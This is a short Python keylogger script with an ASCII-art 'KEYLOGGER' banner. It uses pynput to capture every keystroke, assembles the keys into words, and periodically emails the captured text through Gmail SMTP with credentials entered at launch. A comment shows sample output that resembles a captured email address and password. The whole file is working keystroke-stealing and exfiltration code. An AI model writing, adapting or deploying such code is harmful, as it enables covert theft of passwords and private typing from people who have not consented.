import getpass
# email protocol library
import smtplib

from pynput.keyboard import Key, Listener


print(

    """ _        _______           _        _______  _______  _______  _______  _______ 
| \    /\(  ____ \|\     /|( \      (  ___  )(  ____ \(  ____ \(  ____ \(  ____ )
|  \  / /| (    \/( \   / )| (      | (   ) || (    \/| (    \/| (    \/| (    )|
|  (_/ / | (__     \ (_) / | |      | |   | || |      | |      | (__    | (____)|
|   _ (  |  __)     \   /  | |      | |   | || | ____ | | ____ |  __)   |     __)
|  ( \ \ | (         ) (   | |      | |   | || | \_  )| | \_  )| (      | (\ (   
|  /  \ \| (____/\   | |   | (____/\| (___) || (___) || (___) || (____/\| ) \ \__
|_/    \/(_______/   \_/   (_______/(_______)(_______)(_______)(_______/|/   \__/
                                                                                 """

)

print(""
      "Press escape to exit the program."
      )
# set up email
email = input('Enter email: ')
# getpass makes passowrd invisible
password = getpass.getpass(prompt='Password ', stream=None)

# sending email w/ python boilerplate
server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
server.login(email, password)

# logger
full_log = ' '
word = ' '
# logger will send email every 50 characters
char_limit = 100
# on press function


def on_press(key):
    global word
    global full_log
    global email
    global char_limit

    # first need to check if key pressed is not a character in alphabet
    if key == Key.space or key == Key.enter:
        word += ' '
        full_log += word
        word = ''
        if len(full_log) >= char_limit:
            send_log()
            full_log = ' '

    elif key == Key.shift_l or key == Key.shift_r or key == Key.alt_l or key == Key.alt_r or key == Key.tab or key == Key.ctrl_l or key == Key.ctrl_r:
        return
    elif key == Key.backspace:
        word = word[:-1]  # removes last item in array(slice notation)
    else:
        char = f'{key}'
        char = char[1:-1]  # removes '' by removing first and last char of word
        word += char

    if key == Key.esc:
        return False

# send email function


def send_log():
    message = """\
Subject: Logger

Logger: """ + full_log
    server.sendmail(
        email,  # to
        email,  # from
        message
    )

# SAMPLE OUTPUT
# gmail.com 1gg4t348g@gmail.com 1234abcd


# listner boiler plate
with Listener(on_press=on_press) as listener:
    listener.join()
